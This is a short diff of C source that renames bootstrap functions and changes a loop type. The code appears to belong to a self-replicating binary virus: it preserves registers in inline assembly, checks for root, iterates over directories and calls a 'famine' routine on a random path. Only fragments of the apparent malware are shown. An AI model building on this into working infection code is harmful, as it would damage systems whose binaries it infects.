@@ -4,18 +4,18 @@
 /// BOOTSTRAP FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-static void entry(void);
+static void init(void);
 
 int main(void)
 {
-	constructor();
+	__entry();
 }
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void constructor(void)
+void __entry(void)
 {
 	__asm__ volatile (
 			"push rbx\n"
@@ -36,7 +36,7 @@ void constructor(void)
 			"push r15\n"
 			);
 
-	entry();
+	init();
 
 	__asm__ volatile (
 			"pop r15\n"
@@ -69,7 +69,7 @@ void constructor(void)
 
 static void launch(struct directory *dir, const size_t size)
 {
-	for (uint8_t index = 0; index < size; index++)
+	for (unsigned char index = 0; index < size; index++)
 	{
 		if (update_entry(&(dir[index])) == FAILURE)
 			return ;
@@ -80,7 +80,7 @@ static void launch(struct directory *dir, const size_t size)
 	famine(dir[_get_random_integer(size)].path);
 }
 
-static void entry(void)
+static void init(void)
 {
 	if (_getuid() == 0)
 	{
